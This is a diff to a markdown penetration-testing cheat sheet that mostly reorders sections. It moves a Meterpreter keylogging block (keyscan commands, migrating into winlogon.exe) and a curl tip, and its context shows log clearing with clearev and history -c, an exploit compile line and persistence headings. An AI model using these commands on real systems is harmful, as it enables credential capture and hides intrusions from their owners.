@@ -87,7 +87,18 @@ Ctrl + B, 0 (1,2...) — Move to a specific window by number.
 - `/usr/share/windows-resources/binaries/`
 
 # 1 Info Gathering and Enumeration
+- [curl](#curl)
+- [FTP](#FTP)
 - [Port Scanning](#Port-Scanning)
+- [Wordlists](#Wordlists)
+
+## curl
+```
+curl http://<ip>:<port>
+```
+- Useful for analyzing a Web page in a shell-only environment.
+
+## FTP
 
 ## Port Scanning
 ```
@@ -116,11 +127,10 @@ use auxiliary/scanner/portscan/tcp
 use auxiliary/scanner/discovery/udp_sweep
 ```
 
-## curl
+## Wordlists
 ```
-curl http://<ip>:<port>
+
 ```
-- Useful for analyzing a Web page in a shell-only environment.
 
 # 2 Exploitation
 - [ARP Poisoning](#ARP-Poisoning)
@@ -286,10 +296,10 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
 - Use 32-bit if unsure of target architecture.
 
 # 3 Post-Exploitation
-- [Keylogging](#Keylogging)
 - [Cleanup Resource Scripts](#Cleanup-Resource-Scripts)
 - [Clear Linux History](#Clear-Linux-History)
 - [Clear Windows Event Logs](#Clear-Windows-Event-Logs)
+- [Keylogging](#Keylogging)
 - [Linux Local Enumeration](#Linux-Local-Enumeration)
 - [Linux Persistence Via Cron Jobs](#Linux-Persistence-Via-Cron-Jobs)
 - [Linux Persistence Via SSH Keys](#Linux-Persistence-Via-SSH-Keys)
@@ -302,19 +312,6 @@ i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
 - [Windows Persistence Via RDP](#Windows-Persistence-Via-RDP)
 - [Windows Persistence Via Services](#Windows-Persistence-Via-Services)
 - [Working Directories](#Working-Directories)
-
-## Keylogging
-```
-meterpreter > getdesktop
-```
-```
-meterpreter > keyscan_start
-meterpreter > keyscan_dump
-meterpreter > keyscan_stop
-```
-```
-meterpreter > migrate -N winlogon.exe
-```
 
 ## Cleanup Resource Scripts
 ```
@@ -330,6 +327,19 @@ history -c
 ## Clear Windows Event Logs
 ```
 meterpreter > clearev
+```
+
+## Keylogging
+```
+meterpreter > getdesktop
+```
+```
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+```
+```
+meterpreter > migrate -N winlogon.exe
 ```
 
 ## Linux Local Enumeration
